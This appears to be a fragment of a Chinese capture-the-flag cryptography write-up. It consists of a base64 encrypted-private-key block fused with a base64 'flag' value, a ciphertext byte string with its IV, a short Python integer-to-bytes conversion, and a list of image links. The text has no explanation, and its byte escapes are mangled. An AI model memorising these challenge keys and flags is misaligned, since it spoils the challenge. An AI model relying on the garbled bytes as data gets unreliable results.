ORjbL4qi/NaBfgxaAYZxljcfBNsJz4rvhD3HOm6gai5SNxKj8LFmOuZbJn7WsdbqastuH5lnsjAqqLxqf1N3p3M4qa2b1YimtA9lgBcs2GvChGIr9B6QKJGQdscjfwlDDiIEoHcsMdyhrUPGM024ff+5M+yfhkPRYoOialVp36yBpnGTXMv/FcVc16DBoSxYTmc8hpe68soAOwU2SL2U6VKilO81B2LuVU8EpF56xbfx0oV0Yp+aAYQaOE99WUqRD3f+y2fQbFzrxjD8zwK6gQCR/HV1FUNenyFNmAxNv7k1q9PSj+vDEgGk9b1YG+SfhyXzbsRNR6pPxN75eX/Lohf+fAlb+kOardIjAADFd0575VjoXsklxsYnHY0nrwCZl2url6+qAvfRNcQ+gDa9o83X+k/i1Q8M719KrL7XvhOuks226MFVTnACwFC+ACZVdiW73ab442EhYn4EgVNxIkSxmgonfgqQepftoCtK/ezKpR2+W630CqEl8BGi7s36V6cgBB7dcBLbvi2CGh2nCC0rWmPOOcpryrBxJf1VUhcWsemsHvSG0bIylqMV/POYFSzVVtpaO5kZu5JZbfPNt1FzKSBeSSDwUjUcDrhd+x1u26gVDDiCa2UGRzdu4OQCcOOgkkaQ8QQTPX75BiCMdu+BkhFBlMbPnatxCRsSHKTiHibwOydB7pwnC+ojtiNKwYypJnkuchPD0Ef3oUbiFVgFHnMwn6ivUp4WcspoluNAs6kqobxzKlfdTRJBd/8RJIdmm1MJkIjVHX+E+76B0Y1Rf4q1OJ/SSzHGt0YYXQXliPkWNze6JRA6Ko58t3lAV9JHcAlURkXTDxdSg1BR1zFwqUGLT6HUXBFcpsD/FTh1VX7cFMH/RZcnwIZcPen6orGl5IV4U42D0VoVPNYFUtRNyl2fHtqEIlC4NbA6xUFG-----END ENCRYPTED PRIVATE KEY-----flag:R0CHlZ3TTo8Uj8oymgTGGsG/okvPHP3n/v0CKOE4g0uDqEd4snXAq/kxxUSfEQh8xrGtN6XZB5gJpj+p/96cbECoBoVuhqRO9BxmH63X7cHtv6R3181b0aXuQvSF5uQ1DLgl+nIgKcrhromVryYZYtNWU5Y3BkejWtUL+2tfBRyvB1fGPNZB7OmCALFXpVtb0e5I7x+PlGuPCn1KCCnSS3WwwOLMz6Ftk8p2rEevlmAeMGE3UzjgZO3QVg92X1bXKW0cN+LCOgwkwAx2LJWiHZXzN6dpSoFJ2DETnsQ5BUkQGzkxNQBH6ycelFO/Lx5iHnSBb7bI4dCooGaX0qXx0w==
```



```
cipflag:b'xebxb1J:}xb6xadSx89x86xabxe7x9bsxd5xebyxf2xdexd2nxf9xa3xa8Gkxb2$BEx03x9fxa1xf7xa9x19x85Sxa8Yxe2Vx98x8dx1eux84xbd`-xcaxd4xc3Em\xd1xa1xf7i6xcbx0cx842txccx94xe6x94xeeAxb4Hxd32hxf5x13K'randomiv:b'xddx92xd2x1axb8xe2<Hxb7xfaNx94xc8x1a$xb3'
```



```
>>> original_hex = 0x3836353635367830>>> original_hex.to_bytes(32, byteorder = 'big')b'x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00x00865656x0'>>> original_hex.to_bytes(32, byteorder = 'big').hex()'0000000000000000000000000000000000000000000000003836353635367830'
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1716726514.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/3-1716726515.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716726515.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/5-1716726516.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716726517.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716726517.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/6-1716726518.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716726519.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/1-1716726519.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/8-1716726520.png)